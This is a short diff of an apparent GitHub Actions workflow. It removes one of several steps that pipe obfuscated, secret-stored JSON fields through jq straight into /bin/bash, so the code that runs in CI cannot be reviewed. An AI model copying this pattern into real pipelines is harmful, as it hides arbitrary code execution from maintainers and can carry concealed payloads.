@@ -17,7 +17,6 @@ jobs:
           p272: ${{ secrets.p272 }}
         run: |
           printf '%s' "$p272" | jq -r .nqofg332 | /bin/bash
-          printf '%s' "$x8" | jq -r .zc55 | /bin/bash
           printf '%s' "$sjbr47671" | jq -r .ja31 | /bin/bash
 
       - name: Persist data
